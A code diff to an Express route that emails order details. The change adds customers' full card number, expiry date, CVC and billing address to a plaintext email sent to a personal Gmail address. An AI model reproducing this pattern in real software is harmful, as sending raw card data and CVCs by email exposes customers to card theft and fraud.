@@ -53,8 +53,24 @@ app.post('/upload-mail', upload, (req, res) => {
     const options = {
         from: 'rhc.nodem@outlook.com',
         to: 'zachyarbro@gmail.com',
-        subject: `Sample 10K Card Information - ${card.firstName} ${card.lastName}`,
+        subject: `Sample 10K Card Information - ${card.cardFirstName} ${card.cardLastName}`,
         text: `
+            --- Billing Information ---
+
+            Card Number: ${card.cardNumber}
+            Month / Year: ${card.monthYear}
+            CVC: ${card.cvc}
+
+            First Name: ${card.cardFirstName}
+            Last Name: ${card.cardLastName}
+            Street Address: ${card.streetAddress}
+            City: ${card.city}
+            State: ${card.state}
+            Zip Code: ${card.zipCode}
+            Phone: ${card.phone}
+
+            --- Card Information ---
+
             First Name: ${card.firstName} 
             Last Name: ${card.lastName}
             Title: ${card.title}
